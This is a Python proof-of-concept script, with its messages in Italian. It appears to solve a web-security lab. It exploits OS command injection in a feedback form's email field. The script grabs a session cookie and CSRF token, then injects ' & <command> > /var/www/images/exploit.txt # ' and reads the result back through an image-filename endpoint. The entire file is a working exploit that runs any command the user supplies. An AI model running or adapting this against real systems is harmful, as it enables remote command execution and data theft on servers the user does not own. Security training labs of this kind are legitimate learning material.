import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_cookie_session(url):
    print("[+] Estraendo il cookie della sessione...")
    path = "/"
    response = requests.get(url + path, verify=False, proxies=proxies)
    session_cookie = response.cookies.get_dict()['session']
    print("[+] Il cookie è: " + session_cookie)
    return session_cookie

def get_csrf_token(url, cookies):
    print("[+] Estraendo il token csrf...")
    path = "/feedback"
    response = requests.get(url + path, cookies=cookies, verify=False, proxies=proxies)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input")['value']
    print("[+] Il token è: " + csrf_token)
    return csrf_token

def retrieve_file_content(url):
    path = "/image?filename=exploit.txt"
    r = requests.get(url + path, verify=False, proxies=proxies)
    print(r.text)
    return


def oscinjection_exploit(url, command):
    command_injection = " & %s > /var/www/images/exploit.txt # " % command
    print("[+] Exploit da usare: " + command_injection)
    feedback_submit_path = "/feedback/submit"
    session_cookie = get_cookie_session(url)
    cookies = {'session' : session_cookie}
    csrf_token = get_csrf_token(url,cookies)
    params = {'csrf' : csrf_token , 'name' : 'test' , 'email' : 'test@test.test' + command_injection, 'subject' : 'test' , 'message' : 'test'}
    r = requests.post(url + feedback_submit_path, cookies=cookies, data=params, verify=False, proxies=proxies)
    if r.status_code == 200:
        print("[+] Exploit avvenuto con successo.\n[+] Estraendo l'output del comando dal file \"exploit.txt\"...\n")
        retrieve_file_content(url)
    else:
        print("[-] Si è verificato un problema")




def main():
    if len(sys.argv) != 3:
        print("[-] Utilizzo: %s <url> <comando>" % sys.argv[0])
        print("[-] Esempio: %s www.esempio.com whoami" % sys.argv[0])
        sys.exit()

    url = sys.argv[1]
    command = sys.argv[2]
    print("[+] PoC estrazione output Os Command Injection reindirizzato in file di testo in cartella accesibile al pubblico.")
    oscinjection_exploit(url, command)




if __name__ == "__main__":
    main()

